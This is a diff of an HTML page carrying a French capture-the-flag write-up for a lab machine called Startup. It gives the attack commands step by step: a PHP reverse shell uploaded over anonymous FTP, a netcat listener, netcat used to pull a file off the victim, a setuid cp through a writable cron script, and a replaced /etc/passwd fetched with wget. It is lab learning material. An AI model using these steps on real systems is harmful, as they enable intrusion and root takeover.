@@ -19,38 +19,42 @@
           <span> <a href="#">Home</a></span>
           <span> <a href="#">Whoami</a></span>
           <span> <a href="#">Contact</a></span>
-          <div class="thm"><script src="https://tryhackme.com/badge/131505"></script></div>
         </div>
-        <h1>Write-up : Startup</h1>
+        <div class="parent">
+        <h1 class="child">Write-up : Startup</h1>
+        </div>
         <br>
         <br>
         <section class="article">
+            <div class="parents">
             <h2 class="surl">Énumération</h2>
+            </div>
             <br>
-            <p>On commence par un petit nmap avec la commande :<span style="color: #007bff; background: rgb(21 27 39 / 10%) ;"> nmap -sC -sV 10.10.138.228</span>
-                et on obtient le résultat suivant 
-            </p>
-            <img  class="displayed" src="../../img/res_nmap.PNG" alt="enum_lulz">
-            <p>Nous avons 3 port ouverts : <span  style="color: #007bff; background: rgb(21 27 39 / 10%) ;">ssh:22, ftp:21 et http:80</span>
-            on essayera donc de se connecter en anonymous au ftp un peu plus tard mais avant cela  
+            <br>
+            <br>
+            <img  class="displayed1" src="../../img/res_nmap.PNG" alt="enum_lulz">
+            <p> On commence par un petit nmap avec la commande :<span style="color: #007bff; background: rgb(21 27 39 / 10%) ;"> nmap -sC -sV 10.10.138.228
+            </span>nous avons 3 port ouverts : <span  style="color: #007bff; background: rgb(21 27 39 / 10%) ;">ssh:22, ftp:21 et http:80</span> 
             on jette un coup d'oeil au site web tournant sur le port 80, on tombe sur une page classic, rien d'intéressant dans le code source,
             je vais donc essayer de voir s'il n'y a pas de dossier intéressant, on fuzze avec gobuster en utlisant la commande : 
             <span style="color: #007bff; background: rgb(21 27 39 / 10%) ;">gobuster dir -u http://10.10.138.228 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100</span>
             et on tombe sur  le dossier file/</p>
-            <img  class="displayed" src="../../img/gobuster.PNG" alt="gobu_lulz">
+            <img  class="displayed2" src="../../img/gobuster.PNG" alt="gobu_lulz">
             <p>Bingo !!! on a un dossier FTP ainsi q'un fichier nommé notice, rien de sympa dans le txt.
                Mon premier réflexe a été de me dire qu'on pouvais sans doute upload un reverse-shell en php
                donc on se connecte en anonymous sur le ftp on va dans la directory ftp/ et je tape la commande
                <span style="color: #007bff; background: rgb(21 27 39 / 10%) ;">put php-reverse-shell.php</span>
             </p>
-            <img  class="displayed"src="../../img/ftp.PNG" alt="ftp_what?">
+            <img  class="displayed3" src="../../img/ftp.PNG" alt="ftp_what?">
             <p>On refresh la page web on voit que notre reverse-shell c'est upload correctement ce qui va nous
                 mener à l'exploitation...
             </p>
             <br>
             <br>
             <br>
+            <div class="parents">
             <h2 class="surl">Exploit</h2>
+            </div>
             <br>
             <p>Maintenant que nous avons upload notre reverse-shell avant de l'éxécuter on set un listener avec netcat en tapant la commande suivante :
                 <span style="color: #007bff; background: rgb(21 27 39 / 10%) ;">nc -lvnp 6666</span>et on obient avec 
@@ -60,21 +64,23 @@
             <br>
             <br>
             <br>
+            <div class="parents">
             <h2 class="surl">Privesc</h2>
+            </div>
             <br>
             <p>Alors concernant le privesc j'ai pu voir que tout le monde avaient fait la même méthode
                Donc j'en ai utliser une autre mais avant en faisant un petit ls on obtient la réponse à la première
                question dans le fichier <span style="color: #007bff;">recipe.txt</span>. Par la suite on voit un fichier nommé incidents en se déplacant
                dedans on tombe sur un fichier  nommé <span style="color: #007bff; background: rgb(21 27 39 / 10%) ;">suspicious.pcapng</span>              
             </p>
-            <img  class="displayed" src="../../img/sus.PNG" alt="red_sus_hmmm!!!">
+            <img  class="displayed4" src="../../img/sus.PNG" alt="red_sus_hmmm!!!">
             <p>Pour le récuperer il nous suffit de taper les commandes suivantes afin de récuperer le fichier,
                Sur votre machine : <span style="color: #007bff; background: rgb(21 27 39 / 10%) ;"> nc -lvp "PORT" > "FILE"</span> <br> et sur la machine victime :
                <span style="color: #007bff; background: rgb(21 27 39 / 10%) ;">nc "votre IP" "votre PORT (ex:1234)" < "FILE" </span>
                Une fois le fichier récuperé on fait tout simplement un strings suspicious.pcapng et en fouillant un peu
                on tombe sur le mdp pour le user lennie
             </p>
-            <img class="displayed" src="../../img/pass.PNG" alt="grrrr">
+            <img class="displayed4" src="../../img/pass.PNG" alt="grrrr">
             <p>On peut maitenant accéder au user lennie en faisant <span style="color: #007bff;">su lennie, cd /home/lennie puis ls</span> et bingo
                on chope le flag user.txt. Enfin pour le privesc j'ai tout simplement modifier le fichier <span style="color: #007bff;">/etc/passwd</span> afin de pouvoir me connecter en tant que vragrant(user)
                qui lui possède les droits d'administrateur. Pour cela on copie le /etc/passwd de la
@@ -82,16 +88,16 @@
                salt password avec la commande suivant <span style="color: #007bff; background: rgb(21 27 39 / 10%) ;">openssl passwd -1 -salt abc 123</span>               
             </p>
             <br>
-            <img  class="displayed "src="../../img/salt.PNG" alt="bzzzzt">
+            <img  class="displayed5"src="../../img/salt.PNG" alt="bzzzzt">
             <br>
-            <p>Puis on copie le salt dans notre fichier passwd que l'on a crée à la place du <span style="color: #007bff;">X</span> juste à coté du USER
-               Maintenant on modifie le fichier print.sh en y metttant chmod u+s /bin/cp à la place de echo 'Done'.
-               Une fois cela fait on attend 1 à 2 minutes et pendant ce temps on met un petit serveur http en place avec python :
+            <p>On copie le salt dans notre fichier passwd que l'on a crée à la place du <span style="color: #007bff;">X</span> juste à coté du USER
+               On modifie le fichier print.sh en y metttant chmod u+s /bin/cp.
+               Une fois cela fait on attend 1 à 2 minutes et pendant ce temps on met un serveur http en place avec python :
                <span  style="color: #007bff; background: rgb(21 27 39 / 10%) ;">python -m SimpleHTTPServer 80</span> afin de transférer le file et on le télécharge dans la directory /tmp :
-               wget http://votreIP/passwd puis cp passwd /etc/passwd et voila le tour est jouer on a plus qu'à se
+               wget http://votreIP/passwd puis cp passwd /etc/passwd et voila on a plus qu'à se
                connecter en tant que vagrant avec le password 123 et de cat le flag root.txt
             </p>
-            <img  class="displayed "src="../../img/root.jpg" alt="rrrrrrrr">
+            <img  class="displayed5"src="../../img/root.jpg" alt="rrrrrrrr">
             <br>
             <p>Et voilà j'ai pu root cette machine assez facilement néanmoins elle était vraiment sympa
                Merci d'avoir jeter un coup à ma première Write-up et à très bientôt !!!
